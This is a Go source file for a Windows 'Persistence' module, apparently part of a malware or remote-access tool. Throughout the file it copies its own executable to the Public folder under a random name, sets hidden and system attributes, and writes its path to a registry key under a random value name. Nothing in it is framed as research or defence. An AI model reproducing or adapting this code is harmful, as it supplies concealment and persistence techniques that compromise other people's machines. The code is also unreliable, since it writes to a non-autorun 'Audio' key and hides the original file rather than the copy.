package main

import (
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"math/rand"
	"os"
	"strings"
	"syscall"
)

type Persistence struct{}

func (p *Persistence) Init(config Config) error {
	var err error
	if config.install {
		err = Install()
	}
	if config.registry {
		err = Registry()
	}
	return err
}

func Install() error {
	filename, err := os.Executable()
	if err != nil {
		return err
	}
	if !strings.Contains(filename, os.Getenv("public")) {
		err := CopyFile(filename, os.Getenv("public")+"\\"+RandomString(7)+".exe")
		if err != nil {
			return err
		}
	}
	cFilename, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}
	err = syscall.SetFileAttributes(cFilename, syscall.FILE_ATTRIBUTE_SYSTEM|syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		return err
	}
	return nil
}

func Registry() error {
	filename, err := os.Executable()
	if err != nil {
		return err
	}
	registryName := RandomString(8)
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Audio`,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := key.SetStringValue(registryName, filename); err != nil {
		return err
	}
	if err := key.Close(); err != nil {
		return err
	}
	return nil
}

func CopyFile(src, dst string) error {
	input, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dst, input, 0644)
	if err != nil {
		return err
	}
	return nil
}

func RandomString(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
